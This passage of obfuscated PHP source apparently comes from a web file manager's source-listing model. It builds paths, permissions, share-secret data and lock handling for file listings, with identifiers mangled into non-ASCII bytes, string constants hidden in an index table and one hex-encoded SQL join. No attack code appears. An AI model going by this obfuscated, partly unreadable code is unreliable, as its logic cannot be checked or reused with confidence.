continue; } $±Ì£èÍÃ = $ÉÉô¿Âº[$­ø¤Å]; $±Ì£èÍÃ[$§şÙŸ”ˆ[86]] = $À×ˆ·­£[$§şÙŸ”ˆ[86]]; $±Ì£èÍÃ[$§şÙŸ”ˆ[32]] = $À×ˆ·­£[$§şÙŸ”ˆ[32]]; if (!isset(self::$cacheFileInfo[$§şÙŸ”ˆ[483] . $­ø¤Å])) { self::$cacheFileInfo[$§şÙŸ”ˆ[483] . $­ø¤Å] = array_merge(array(), $±Ì£èÍÃ); } unset($ÉÉô¿Âº[$­ø¤Å][$§şÙŸ”ˆ[94]]); $§®£ÔØ = is_array($˜Ô¸«á¯[$­ø¤Å]) ? $˜Ô¸«á¯[$­ø¤Å] : array(); $À×ˆ·­£[$§şÙŸ”ˆ[180]] = array_merge($§®£ÔØ, $ÉÉô¿Âº[$­ø¤Å]); if (isset($À×ˆ·­£[$§şÙŸ”ˆ[180]][$§şÙŸ”ˆ[179]])) { $À×ˆ·­£[$§şÙŸ”ˆ[179]] = json_decode($À×ˆ·­£[$§şÙŸ”ˆ[180]][$§şÙŸ”ˆ[179]], !0); unset($À×ˆ·­£[$§şÙŸ”ˆ[180]][$§şÙŸ”ˆ[179]]); } } unset($À×ˆ·­£); } protected function _listAppendSourceInfo(&$şœñŞØ, $íĞ¿ÛÏÂ) { $ŒÃ‘¨Ò =& $_SERVER[„Ç©ñÎ©]; if (!defined($ŒÃ‘¨Ò[484])) { return; } $é¿•ŠÛ• = Model($ŒÃ‘¨Ò[485])->listData(); $Ìµ¿Ãü½ = Model($ŒÃ‘¨Ò[434])->listData(); $ãÆıšà = Model($ŒÃ‘¨Ò[424])->listData(); $„¼Úô—  = Model($ŒÃ‘¨Ò[486])->listSimple(); $Œ¡¿Ğ¢™ = array_to_keyvalue($é¿•ŠÛ•, $ŒÃ‘¨Ò[408]); $ãí‡¯Ë» = array_to_keyvalue_group($Ìµ¿Ãü½, $ŒÃ‘¨Ò[94], $ŒÃ‘¨Ò[435]); $½“½È™º = array_to_keyvalue($ãÆıšà, $ŒÃ‘¨Ò[94]); $ùá¯¯ëº = array_to_keyvalue_group($„¼Úô— , $ŒÃ‘¨Ò[411]); foreach ($şœñŞØ as &$ë‰÷ïà«) { $ë‰÷ïà«[$ŒÃ‘¨Ò[96]] = array($ŒÃ‘¨Ò[487] => 0, $ŒÃ‘¨Ò[488] => 0, $ŒÃ‘¨Ò[489] => 0); if (isset($½“½È™º[$ë‰÷ïà«[$ŒÃ‘¨Ò[411]]])) { $ë‰÷ïà«[$ŒÃ‘¨Ò[96]][$ŒÃ‘¨Ò[490]] = 1; $ë‰÷ïà«[$ŒÃ‘¨Ò[96]][$ŒÃ‘¨Ò[491]] = $½“½È™º[$ë‰÷ïà«[$ŒÃ‘¨Ò[411]]][$ŒÃ‘¨Ò[32]]; } if ($ãí‡¯Ë» && $Œ¡¿Ğ¢™ && isset($ãí‡¯Ë»[$ë‰÷ïà«[$ŒÃ‘¨Ò[411]]])) { $ë‰÷ïà«[$ŒÃ‘¨Ò[96]][$ŒÃ‘¨Ò[492]] = array(); foreach ($ãí‡¯Ë»[$ë‰÷ïà«[$ŒÃ‘¨Ò[411]]] as $Ù»ó÷ÒØ) { $Ğáæ„—˜ = $Œ¡¿Ğ¢™[$Ù»ó÷ÒØ]; $ë‰÷ïà«[$ŒÃ‘¨Ò[96]][$ŒÃ‘¨Ò[492]][] = array($ŒÃ‘¨Ò[493] => $Ğáæ„—˜[$ŒÃ‘¨Ò[408]], $ŒÃ‘¨Ò[429] => $Ğáæ„—˜[$ŒÃ‘¨Ò[32]], $ŒÃ‘¨Ò[494] => $Ğáæ„—˜[$ŒÃ‘¨Ò[495]]); } } if ($ùá¯¯ëº && isset($ùá¯¯ëº[$ë‰÷ïà«[$ŒÃ‘¨Ò[411]]])) { $ë‰÷ïà«[$ŒÃ‘¨Ò[96]][$ŒÃ‘¨Ò[496]] = array(); foreach ($ùá¯¯ëº[$ë‰÷ïà«[$ŒÃ‘¨Ò[411]]] as $úø®ï„) { $ë‰÷ïà«[$ŒÃ‘¨Ò[96]][$ŒÃ‘¨Ò[496]] = array($ŒÃ‘¨Ò[497] => $úø®ï„[$ŒÃ‘¨Ò[498]], $ŒÃ‘¨Ò[499] => $úø®ï„[$ŒÃ‘¨Ò[500]], $ŒÃ‘¨Ò[501] => $úø®ï„[$ŒÃ‘¨Ò[411]], $ŒÃ‘¨Ò[502] => $úø®ï„[$ŒÃ‘¨Ò[503]], $ŒÃ‘¨Ò[504] => $úø®ï„[$ŒÃ‘¨Ò[505]], $ŒÃ‘¨Ò[506] => $úø®ï„[$ŒÃ‘¨Ò[506]], $ŒÃ‘¨Ò[507] => $úø®ï„[$ŒÃ‘¨Ò[507]]); } } } unset($ë‰÷ïà«); return $şœñŞØ; } protected function _listAppendChildren(&$š‹ËÔó, $ÓæÌÒÕ¾) { $²ÃâşŠ =& $_SERVER[„Ç©ñÎ©]; $„ƒö×š¯ = array(); $›ÜàæÃÂ = array($²ÃâşŠ[217] => 0, $²ÃâşŠ[218] => 0); foreach ($š‹ËÔó as &$±ßŞ¹³é) { if (!$±ßŞ¹³é[$²ÃâşŠ[419]]) { continue; } $„ƒö×š¯[] = $±ßŞ¹³é[$²ÃâşŠ[411]]; } unset($±ßŞ¹³é); if (!$„ƒö×š¯) { return; } $«¥ÎÓûÈ = array($²ÃâşŠ[441] => array($²ÃâşŠ[7], $„ƒö×š¯), $²ÃâşŠ[440] => 0); $»î¤´ ¸ = array($²ÃâşŠ[441], $²ÃâşŠ[419], $²ÃâşŠ[508] => $²ÃâşŠ[509]); $‹¿³Ì¨é = $this->field($»î¤´ ¸)->where($«¥ÎÓûÈ)->group($²ÃâşŠ[510])->select(); $ûÏ¼áÒ¯ = array(); foreach ($‹¿³Ì¨é as $çÖó…¯¢) { $ªüü’šâ = $çÖó…¯¢[$²ÃâşŠ[441]]; $¾ŠĞÃ©Å = $çÖó…¯¢[$²ÃâşŠ[419]] == $²ÃâşŠ[98] ? $²ÃâşŠ[218] : $²ÃâşŠ[217]; if (!isset($ûÏ¼áÒ¯[$ªüü’šâ])) { $ûÏ¼áÒ¯[$ªüü’šâ] = array($²ÃâşŠ[217] => 0, $²ÃâşŠ[218] => 0); } $ûÏ¼áÒ¯[$ªüü’šâ][$¾ŠĞÃ©Å] += $çÖó…¯¢[$²ÃâşŠ[509]]; } foreach ($š‹ËÔó as &$±ßŞ¹³é) { if (!$±ßŞ¹³é[$²ÃâşŠ[419]]) { continue; } $…Áø€ ª = is_array($ûÏ¼áÒ¯[$±ßŞ¹³é[$²ÃâşŠ[411]]]) ? $ûÏ¼áÒ¯[$±ßŞ¹³é[$²ÃâşŠ[411]]] : $›ÜàæÃÂ; $±ßŞ¹³é[$²ÃâşŠ[218]] = $…Áø€ ª[$²ÃâşŠ[218]]; $±ßŞ¹³é[$²ÃâşŠ[217]] = $…Áø€ ª[$²ÃâşŠ[217]]; unset($±ßŞ¹³é[$²ÃâşŠ[421]]); } unset($±ßŞ¹³é); } protected function _listAppendAuth(&$â³ú°±) { $øûöÃï§ =& $_SERVER[„Ç©ñÎ©]; if (!defined($øûöÃï§[484])) { return; } $Ã€‚ÍÒ÷ = array(); foreach ($â³ú°± as $›ÒÇ”–Ğ) { if ($›ÒÇ”–Ğ[$øûöÃï§[420]] == self::TYPE_GROUP) { $Ã€‚ÍÒ÷[] = $›ÒÇ”–Ğ[$øûöÃï§[411]]; } } if (!$Ã€‚ÍÒ÷) { return; } $­¤¸‡·Í = array_to_keyvalue($â³ú°±, $øûöÃï§[411]); $å Ã€Ê = Model($øûöÃï§[511])->getSourceList($Ã€‚ÍÒ÷, $­¤¸‡·Í); $˜å»²‹© = $GLOBALS[$øûöÃï§[512]] == 1; foreach ($â³ú°± as $‚‘Ó€ ù => &$›ÒÇ”–Ğ) { $›ÒÇ”–Ğ[$øûöÃï§[422]] = $å Ã€Ê[$›ÒÇ”–Ğ[$øûöÃï§[411]]]; if (!$›ÒÇ”–Ğ[$øûöÃï§[422]] && $›ÒÇ”–Ğ[$øûöÃï§[420]] == self::TYPE_GROUP) { $›ÒÇ”–Ğ[$øûöÃï§[422]] = Action($øûöÃï§[513])->pathGroupAuthMake($›ÒÇ”–Ğ[$øûöÃï§[514]]); if (!$›ÒÇ”–Ğ[$øûöÃï§[422]] && !$˜å»²‹©) { $›ÒÇ”–Ğ[$øûöÃï§[212]] = !1; $›ÒÇ”–Ğ[$øûöÃï§[211]] = !1; } } if ($›ÒÇ”–Ğ[$øûöÃï§[422]]) { $›ÒÇ”–Ğ[$øûöÃï§[212]] = AuthModel::authCheckEdit($›ÒÇ”–Ğ[$øûöÃï§[422]][$øûöÃï§[423]]); $›ÒÇ”–Ğ[$øûöÃï§[211]] = AuthModel::authCheckView($›ÒÇ”–Ğ[$øûöÃï§[422]][$øûöÃï§[423]]); } $this->groupPathDisplay($›ÒÇ”–Ğ); } unset($›ÒÇ”–Ğ); } public function _listAppendAuthSecret(&$‰ñµÆ£µ) { $È²×ıÒ =& $_SERVER[„Ç©ñÎ©]; if (Model($È²×ıÒ[444])->get($È²×ıÒ[515]) != $È²×ıÒ[98]) { return; } static $»üŞ–Íˆ = false; if (!$»üŞ–Íˆ) { $”áÂüˆ… = Model($È²×ıÒ[516]); $ÁÚâãÈ = Model($È²×ıÒ[517]); $»üŞ–Íˆ = $ÁÚâãÈ->listData(); $»üŞ–Íˆ = array_to_keyvalue($»üŞ–Íˆ, $È²×ıÒ[411]); $õÍÌï—Â = json_decode(Model($È²×ıÒ[444])->get($È²×ıÒ[518]), !0); $õÍÌï—Â = array_to_keyvalue($õÍÌï—Â, $È²×ıÒ[408]); foreach ($»üŞ–Íˆ as $¥å¯ÆĞî => $Ëó¸úã) { $ûêà¸ö = $õÍÌï—Â[$Ëó¸úã[$È²×ıÒ[519]]]; if (!$ûêà¸ö) { $ÁÚâãÈ->remove($Ëó¸úã[$È²×ıÒ[408]]); unset($»üŞ–Íˆ[$¥å¯ÆĞî]); continue; } $¨·’¿µç = $”áÂüˆ…->listData($ûêà¸ö[$È²×ıÒ[422]]); if (!$¨·’¿µç) { $ÁÚâãÈ->remove($Ëó¸úã[$È²×ıÒ[408]]); unset($»üŞ–Íˆ[$¥å¯ÆĞî]); continue; } $Ëó¸úã[$È²×ıÒ[422]] = $¨·’¿µç; $Ëó¸úã[$È²×ıÒ[520]] = $ûêà¸ö; $Ëó¸úã[$È²×ıÒ[521]] = Model($È²×ıÒ[522])->getInfoSimpleOuter($Ëó¸úã[$È²×ıÒ[463]]); $»üŞ–Íˆ[$¥å¯ÆĞî] = $Ëó¸úã; } } $²‚Úƒ = defined($È²×ıÒ[523]) ? USER_ID : $È²×ıÒ[12]; $æÁ¨¨©Ğ = array(); $ûÂà¡ûê = $this->_listAppendPath($æÁ¨¨©Ğ, !0); foreach ($‰ñµÆ£µ as $¥å¯ÆĞî => &$Ëó¸úã) { if (!is_array($Ëó¸úã[$È²×ıÒ[422]])) { continue; } if ($Ëó¸úã[$È²×ıÒ[420]] != $È²×ıÒ[524]) { continue; } if (isset($»üŞ–Íˆ[$Ëó¸úã[$È²×ıÒ[411]]])) { $´Ò½ÅâÓ = $»üŞ–Íˆ[$Ëó¸úã[$È²×ıÒ[411]]]; if (!is_array($Ëó¸úã[$È²×ıÒ[475]])) { $Ëó¸úã[$È²×ıÒ[475]] = array(); } $Ëó¸úã[$È²×ıÒ[475]][$È²×ıÒ[525]] = $´Ò½ÅâÓ[$È²×ıÒ[519]]; $Ëó¸úã[$È²×ıÒ[422]][$È²×ıÒ[526]] = $´Ò½ÅâÓ; $Ëó¸úã[$È²×ıÒ[422]][$È²×ıÒ[527]] = $Ëó¸úã[$È²×ıÒ[528]]; $Ëó¸úã[$È²×ıÒ[422]][$È²×ıÒ[529]] = $È²×ıÒ[98]; if ($´Ò½ÅâÓ[$È²×ıÒ[463]] != $²‚Úƒ) { $Ëó¸úã[$È²×ıÒ[422]][$È²×ıÒ[423]] = $Ëó¸úã[$È²×ıÒ[422]][$È²×ıÒ[423]] & $´Ò½ÅâÓ[$È²×ıÒ[422]][$È²×ıÒ[422]]; } continue; } $úıÅ‚«… = $this->parentLevelArray($Ëó¸úã[$È²×ıÒ[530]]); $¢Áó˜ú = array_reverse($úıÅ‚«…); foreach ($¢Áó˜ú as $¾Ü³Úµ‡ => $È×¶èÁÏ) { if (!isset($»üŞ–Íˆ[$È×¶èÁÏ])) { continue; } $´Ò½ÅâÓ = $»üŞ–Íˆ[$È×¶èÁÏ]; $Ëó¸úã[$È²×ıÒ[422]][$È²×ıÒ[526]] = $´Ò½ÅâÓ; if ($´Ò½ÅâÓ[$È²×ıÒ[463]] != $²‚Úƒ) { $Ëó¸úã[$È²×ıÒ[422]][$È²×ıÒ[423]] = $Ëó¸úã[$È²×ıÒ[422]][$È²×ıÒ[423]] & $´Ò½ÅâÓ[$È²×ıÒ[422]][$È²×ıÒ[422]]; } $ï’˜µ«Ç = $È²×ıÒ[12]; $òó‹Ü¹á = count($úıÅ‚«…) - $¾Ü³Úµ‡; for ($¬ìù³¦ = 0; $¬ìù³¦ < $òó‹Ü¹á; $¬ìù³¦++) { if (!isset($ûÂà¡ûê[$úıÅ‚«…[$¬ìù³¦]])) { $ï’˜µ«Ç = $È²×ıÒ[12]; break; } $ï’˜µ«Ç = $ï’˜µ«Ç . rtrim($ûÂà¡ûê[$úıÅ‚«…[$¬ìù³¦]], $È²×ıÒ[8]) . $È²×ıÒ[8]; } $Ëó¸úã[$È²×ıÒ[422]][$È²×ıÒ[527]] = rtrim($ï’˜µ«Ç, $È²×ıÒ[8]) . $È²×ıÒ[8]; break; } } unset($Ëó¸úã); } public function groupPathDisplay(&$ØõúêçÊ) { $¢Şì¹ğ =& $_SERVER[„Ç©ñÎ©]; if ($ØõúêçÊ[$¢Şì¹ğ[420]] != self::TYPE_GROUP) { return; } $ı²Ú¢æ = Model($¢Şì¹ğ[531])->getInfo($ØõúêçÊ[$¢Şì¹ğ[514]]); $ªÑ¼ÍÀ³ = $this->parentLevelArray($ı²Ú¢æ[$¢Şì¹ğ[530]]); $Íï¯¦š­ = $¢Şì¹ğ[12]; foreach ($ªÑ¼ÍÀ³ as $¨ïèİù«) { $²ıí£í = Model($¢Şì¹ğ[531])->getInfo($¨ïèİù«); $Íï¯¦š­ .= $²ıí£í[$¢Şì¹ğ[96]][$¢Şì¹ğ[411]] . $¢Şì¹ğ[50]; } $ØõúêçÊ[$¢Şì¹ğ[532]] = $ı²Ú¢æ[$¢Şì¹ğ[441]]; $ØõúêçÊ[$¢Şì¹ğ[533]] = $ı²Ú¢æ[$¢Şì¹ğ[530]]; $ØõúêçÊ[$¢Şì¹ğ[534]] = $ı²Ú¢æ[$¢Şì¹ğ[535]]; $ØõúêçÊ[$¢Şì¹ğ[536]] = $Íï¯¦š­ . $ı²Ú¢æ[$¢Şì¹ğ[96]][$¢Şì¹ğ[411]]; } protected function _listAppendPath(&$ûõµµÀ, $çò‘ìˆ× = false) { $›â’ò³æ =& $_SERVER[„Ç©ñÎ©]; static $ÛÍ˜şûŞ = array(); $©À­İ‰£ = array(); $¶Òò¿æ = array(); if ($çò‘ìˆ×) { return $ÛÍ˜şûŞ; } foreach ($ûõµµÀ as &$ë•îõÛá) { $ã•„è×ù = $ë•îõÛá[$›â’ò³æ[411]]; if ($ë•îõÛá[$›â’ò³æ[419]] == $›â’ò³æ[98] && $ë•îõÛá[$›â’ò³æ[441]] != 0) { $ÛÍ˜şûŞ[$ã•„è×ù] = $ë•îõÛá[$›â’ò³æ[32]]; } if ($ë•îõÛá[$›â’ò³æ[419]] == $›â’ò³æ[98] && $ë•îõÛá[$›â’ò³æ[441]] == 0 && !isset($ÛÍ˜şûŞ[$ã•„è×ù])) { $ÛÍ˜şûŞ[$ã•„è×ù] = $this->_listAppendPathRoot($ë•îõÛá, array()); } if (isset($¶Òò¿æ[$ë•îõÛá[$›â’ò³æ[530]]])) { continue; } $¶Òò¿æ[$ë•îõÛá[$›â’ò³æ[530]]] = !0; $¨£³ù€¯ = $this->parentLevelArray($ë•îõÛá[$›â’ò³æ[530]]); foreach ($¨£³ù€¯ as $Ìüª³‰õ => $¢¿×öĞ¤) { if (isset($ÛÍ˜şûŞ[$¢¿×öĞ¤])) { continue; } if ($Ìüª³‰õ == 0) { $ÛÍ˜şûŞ[$¢¿×öĞ¤] = $this->_listAppendPathRoot($ë•îõÛá, $¨£³ù€¯); } if ($Ìüª³‰õ != 0) { $©À­İ‰£[] = $¢¿×öĞ¤; } } } unset($ë•îõÛá); $©À­İ‰£ = array_unique($©À­İ‰£); if (count($©À­İ‰£) > 0) { $€¸„Ö‘‡ = array($›â’ò³æ[426] => array($›â’ò³æ[427], $©À­İ‰£)); if (count($©À­İ‰£) == 1) { $¬åñŸì¼ = $this->sourceInfo($©À­İ‰£[0]); $¢Üãğñø = is_array($¬åñŸì¼) ? array($¬åñŸì¼) : !1; } else { $¢Üãğñø = $this->field($›â’ò³æ[537])->where($€¸„Ö‘‡)->select(); } if (!$¢Üãğñø) { $¢Üãğñø = array(); } foreach ($¢Üãğñø as $Ä‚â÷öõ) { $ÛÍ˜şûŞ[$Ä‚â÷öõ[$›â’ò³æ[411]]] = $Ä‚â÷öõ[$›â’ò³æ[32]]; } } $–ç„™À¸ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $å¢Ã”ùÕ = array(); foreach ($ûõµµÀ as &$ë•îõÛá) { $Ôé«øğ’ = $ë•îõÛá[$›â’ò³æ[530]]; $òĞé¬Øİ = $›â’ò³æ[12]; if (isset($å¢Ã”ùÕ[$Ôé«øğ’])) { $òĞé¬Øİ = $å¢Ã”ùÕ[$Ôé«øğ’]; } else { $¨£³ù€¯ = $this->parentLevelArray($ë•îõÛá[$›â’ò³æ[530]]); foreach ($¨£³ù€¯ as $Ìüª³‰õ => $¢¿×öĞ¤) { if (isset($ÛÍ˜şûŞ[$¢¿×öĞ¤])) { $òĞé¬Øİ .= $ÛÍ˜şûŞ[$¢¿×öĞ¤] . $›â’ò³æ[8]; } } $å¢Ã”ùÕ[$Ôé«øğ’] = $òĞé¬Øİ; } $òĞé¬Øİ .= $ë•îõÛá[$›â’ò³æ[32]]; if ($ë•îõÛá[$›â’ò³æ[419]] == $›â’ò³æ[98]) { $òĞé¬Øİ .= $›â’ò³æ[8]; } $ë•îõÛá[$›â’ò³æ[528]] = str_replace($›â’ò³æ[538], $›â’ò³æ[8], $òĞé¬Øİ); if ($ë•îõÛá[$›â’ò³æ[441]] == $›â’ò³æ[207]) { $ë•îõÛá[$›â’ò³æ[32]] = trim($ÛÍ˜şûŞ[$ë•îõÛá[$›â’ò³æ[411]]], $›â’ò³æ[8]); $ë•îõÛá[$›â’ò³æ[528]] = $ë•îõÛá[$›â’ò³æ[32]] . $›â’ò³æ[8]; } if (intval($ë•îõÛá[$›â’ò³æ[420]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ë•îõÛá, $¨£³ù€¯, $–ç„™À¸); } } unset($ë•îõÛá); return $ûõµµÀ; } private function _listAppendPathRecycle(&$û—ßÓÓû, $ø©µÒ‘, $İÒ³ãå˜) { $²«•Ìè¦ =& $_SERVER[„Ç©ñÎ©]; if (!in_array($İÒ³ãå˜, $ø©µÒ‘) && $û—ßÓÓû[$²«•Ìè¦[411]] != $İÒ³ãå˜) { return; } $ş¹ÂÉ´Ñ = explode($²«•Ìè¦[8], trim($û—ßÓÓû[$²«•Ìè¦[528]], $²«•Ìè¦[8])); $¢‚Öü¯Ÿ = implode($²«•Ìè¦[8], array_slice($ş¹ÂÉ´Ñ, 2)); $û—ßÓÓû[$²«•Ìè¦[528]] = $²«•Ìè¦[8] . LNG($²«•Ìè¦[539]) . $²«•Ìè¦[8] . ltrim($¢‚Öü¯Ÿ, $²«•Ìè¦[8]); $û—ßÓÓû[$²«•Ìè¦[530]] = $²«•Ìè¦[540] . implode($²«•Ìè¦[50], array_slice($ø©µÒ‘, 1)) . $²«•Ìè¦[50]; if ($û—ßÓÓû[$²«•Ìè¦[411]] == $İÒ³ãå˜) { $û—ßÓÓû[$²«•Ìè¦[530]] = $²«•Ìè¦[540]; $û—ßÓÓû[$²«•Ìè¦[441]] = $²«•Ìè¦[207]; $û—ßÓÓû[$²«•Ìè¦[32]] = LNG($²«•Ìè¦[539]); } $û—ßÓÓû[$²«•Ìè¦[541]] = $²«•Ìè¦[542]; } protected function _listAppendPathRoot(&$±€¼éíä, $µºÇ»£¶) { $Ñûùê£ñ =& $_SERVER[„Ç©ñÎ©]; static $ÎàëŠĞ = false; $²š×àƒ‘ = $Ñûùê£ñ[12]; if ($±€¼éíä[$Ñûùê£ñ[420]] == self::TYPE_USER) { if (defined($Ñûùê£ñ[484]) && $±€¼éíä[$Ñûùê£ñ[514]] == USER_ID) { $²š×àƒ‘ = LNG($Ñûùê£ñ[543]); if ($ÎàëŠĞ === !1) { $™¬¿–Ô = Model($Ñûùê£ñ[544])->getInfoFull(USER_ID); $ÎàëŠĞ = _get($™¬¿–Ô, $Ñûùê£ñ[545], $Ñûùê£ñ[12]); } if ($µºÇ»£¶ && $µºÇ»£¶[0] == $ÎàëŠĞ || !$µºÇ»£¶ && $±€¼éíä[$Ñûùê£ñ[411]] == $ÎàëŠĞ) { $²š×àƒ‘ = LNG($Ñûùê£ñ[546]); $±€¼éíä[$Ñûùê£ñ[547]] = $Ñûùê£ñ[548]; } if (!$µºÇ»£¶) { $±€¼éíä[$Ñûùê£ñ[32]] = $²š×àƒ‘; } } else { $ŒÄ¢Äšå = Model($Ñûùê£ñ[522])->getInfoSimple($±€¼éíä[$Ñûùê£ñ[514]]); $²š×àƒ‘ = LNG($Ñûùê£ñ[549]) . $Ñûùê£ñ[172] . $ŒÄ¢Äšå[$Ñûùê£ñ[32]] . $Ñûùê£ñ[174]; $±€¼éíä[$Ñûùê£ñ[550]] = array($Ñûùê£ñ[32] => $ŒÄ¢Äšå[$Ñûùê£ñ[32]], $Ñûùê£ñ[551] => $ŒÄ¢Äšå[$Ñûùê£ñ[551]], $Ñûùê£ñ[552] => $ŒÄ¢Äšå[$Ñûùê£ñ[552]]); } } else { if ($±€¼éíä[$Ñûùê£ñ[420]] == self::TYPE_GROUP) { $ŒÄ¢Äšå = Model($Ñûùê£ñ[531])->getInfoSimple($±€¼éíä[$Ñûùê£ñ[514]]); $²š×àƒ‘ = $ŒÄ¢Äšå[$Ñûùê£ñ[32]]; } else { if ($±€¼éíä[$Ñûùê£ñ[420]] == self::TYPE_SYSTEM) { $²š×àƒ‘ = $Ñûùê£ñ[553]; } } } $²š×àƒ‘ = $²š×àƒ‘ ? $Ñûùê£ñ[8] . $²š×àƒ‘ . $Ñûùê£ñ[8] : $Ñûùê£ñ[8]; return $²š×àƒ‘; } protected function _listAppendUser(&$îı‹ÜĞ¿) { $Øì¼ê»” =& $_SERVER[„Ç©ñÎ©]; $´Ôöüçà = array_to_keyvalue($îı‹ÜĞ¿, $Øì¼ê»”[12], $Øì¼ê»”[463]); $î¼ª§´ = array_to_keyvalue($îı‹ÜĞ¿, $Øì¼ê»”[12], $Øì¼ê»”[465]); $õ¡àñÑ = array_merge($´Ôöüçà, $î¼ª§´); $ö°«÷ìâ = Model($Øì¼ê»”[544])->userListInfo($õ¡àñÑ); foreach ($îı‹ÜĞ¿ as &$Â†ûÙ ) { $«ıĞÌáê = $Â†ûÙ [$Øì¼ê»”[463]]; $Â†ûÙ [$Øì¼ê»”[463]] = $ö°«÷ìâ[$«ıĞÌáê] ? $ö°«÷ìâ[$«ıĞÌáê] : !1; $«ıĞÌáê = $Â†ûÙ [$Øì¼ê»”[465]]; $Â†ûÙ [$Øì¼ê»”[465]] = $ö°«÷ìâ[$«ıĞÌáê] ? $ö°«÷ìâ[$«ıĞÌáê] : !1; if (isset($Â†ûÙ [$Øì¼ê»”[475]]) && $Â†ûÙ [$Øì¼ê»”[475]][$Øì¼ê»”[554]]) { $ìË¹‹Èî = $GLOBALS[$Øì¼ê»”[6]][$Øì¼ê»”[99]][$Øì¼ê»”[555]]; if ($Â†ûÙ [$Øì¼ê»”[475]][$Øì¼ê»”[556]] <= time() - $ìË¹‹Èî) { $this->metaSet($Â†ûÙ [$Øì¼ê»”[411]], $Øì¼ê»”[554], null); $this->metaSet($Â†ûÙ [$Øì¼ê»”[411]], $Øì¼ê»”[556], null); unset($Â†ûÙ [$Øì¼ê»”[475]][$Øì¼ê»”[554]]); continue; } $ªàªä¸ß = $Â†ûÙ [$Øì¼ê»”[475]][$Øì¼ê»”[554]]; $Â†ûÙ [$Øì¼ê»”[475]][$Øì¼ê»”[557]] = Model($Øì¼ê»”[544])->getInfoSimpleOuter($ªàªä¸ß); } } unset($Â†ûÙ ); } public function parentLevelArray($ƒâ±—ºÎ) { $”÷§•Ä¢ =& $_SERVER[„Ç©ñÎ©]; $ƒâ±—ºÎ = explode($”÷§•Ä¢[50], trim($ƒâ±—ºÎ, $”÷§•Ä¢[50])); return array_remove_value($ƒâ±—ºÎ, $”÷§•Ä¢[207]); } public function listAll($ÖÒë¬›Ä) { $× …ş¸ =& $_SERVER[„Ç©ñÎ©]; $íˆÓş“ = $this->sourceInfo($ÖÒë¬›Ä); $Ì³¼ğ‡¢ = array($× …ş¸[558] => array($× …ş¸[559], $íˆÓş“[$× …ş¸[530]] . $ÖÒë¬›Ä . $× …ş¸[560]), $× …ş¸[561] => 0); $ıŒ”İ·ê = $× …ş¸[562]; $¿Ûşü = "\x4c\x45\x46\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\157\137\146\151\x6c\x65\40\146\151\154\x65\x20\157\156\40\163\x6f\x75\x72\x63\x65\x2e\x66\x69\154\x65\x49\x44\40\x3d\x20\146\151\154\x65\56\x66\151\x6c\145\111\x44"; $ª…ßÆ×¦ = $this->alias($× …ş¸[455])->field($ıŒ”İ·ê)->where($Ì³¼ğ‡¢)->join($¿Ûşü)->select(); $this->_listAppendAuth($ª…ßÆ×¦); $this->_listAppendUser($ª…ßÆ×¦); $this->_listAppendPath($ª…ßÆ×¦); $ª…ßÆ×¦ = array_to_keyvalue($ª…ßÆ×¦, $× …ş¸[411]); $¤‰ÁÀı = "\57{$íˆÓş“[$× …ş¸[32]]}\57"; $¤‰ÁÀı = $¤‰ÁÀı == $× …ş¸[538] ? $× …ş¸[8] : $¤‰ÁÀı; $Ñïá¾¬ = array(); foreach ($ª…ßÆ×¦ as $Üšöñ² => $ÍëÚ÷õ) { $â…Š÷­ì = $this->parentLevelArray($ÍëÚ÷õ[$× …ş¸[530]]); array_shift($â…Š÷­ì); $š¬‡×ÍÏ = $¤‰ÁÀı; for ($Õê…áËæ = 0; $Õê…áËæ < count($â…Š÷­ì); $Õê…áËæ++) { $š¬‡×ÍÏ .= $ª…ßÆ×¦[$â…Š÷­ì[$Õê…áËæ]][$× …ş¸[32]] . $× …ş¸[8]; } $š¬‡×ÍÏ .= $ÍëÚ÷õ[$× …ş¸[32]]; if ($ÍëÚ÷õ[$× …ş¸[419]]) { $š¬‡×ÍÏ .= $× …ş¸[8]; } $š¬‡×ÍÏ = str_replace($× …ş¸[538], $× …ş¸[8], $š¬‡×ÍÏ); $š¬‡×ÍÏ = str_replace($× …ş¸[538], $× …ş¸[8], $š¬‡×ÍÏ); $ØêÖ»ÚÊ = array($× …ş¸[430] => str_replace($× …ş¸[538], $× …ş¸[8], $š¬‡×ÍÏ), $× …ş¸[563] => intval($ÍëÚ÷õ[$× …ş¸[419]]), $× …ş¸[96] => $this->pathInfoFilter($ÍëÚ÷õ)); if (!$ÍëÚ÷õ[$× …ş¸[419]]) { $ØêÖ»ÚÊ[$× …ş¸[477]] = $ÍëÚ÷õ[$× …ş¸[477]]; $ØêÖ»ÚÊ[$× …ş¸[97]] = $ÍëÚ÷õ[$× …ş¸[94]]; } $Ñïá¾¬[] = $ØêÖ»ÚÊ; } return $Ñïá¾¬; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÏæîÛè) { $Ø‡³é…É =& $_SERVER[„Ç©ñÎ©]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ø‡³é…É[564], $ÏæîÛè); $ˆ§£éä = 1; $this->_lockEvent($ÏæîÛè, array($Ø‡³é…É[565], $Ø‡³é…É[566]), $ˆ§£éä); $this->_lockParent($ÏæîÛè, array($Ø‡³é…É[566]), $ˆ§£éä); $this->_lockEvent($ÏæîÛè, array($Ø‡³é…É[567], $Ø‡³é…É[568]), $ˆ§£éä); $this->_lockCheckEnd($Ø‡³é…É[564], $ÏæîÛè); } public function lockCopyEnd($ÓÎ¢Ûµø) { $ ÌÖ×¾Â =& $_SERVER[„Ç©ñÎ©]; if (!$this->allowLock()) { return; } $‡ÑãÊô† = 0; $this->_lockEvent($ÓÎ¢Ûµø, array($ ÌÖ×¾Â[565], $ ÌÖ×¾Â[566]), $‡ÑãÊô†); $this->_lockParent($ÓÎ¢Ûµø, array($ ÌÖ×¾Â[566]), $‡ÑãÊô†); $this->_lockEvent($ÓÎ¢Ûµø, array($ ÌÖ×¾Â[567], $ ÌÖ×¾Â[568]), $‡ÑãÊô†); } public function lockWriteStart($Ş²öÛåî, $»Âå˜‡— = '') { $ì¯¶¾»è =& $_SERVER[„Ç©ñÎ©]; if (!$this->allowLock()) { return; } $this->_lockCheck($ì¯¶¾»è[565], $Ş²öÛåî); $êğ‚¼ú¨ = 1; $this->_lockKey($ì¯¶¾»è[569] . $Ş²öÛåî . $ì¯¶¾»è[10] . $»Âå˜‡—, $êğ‚¼ú¨); $this->_lockEvent($Ş²öÛåî, 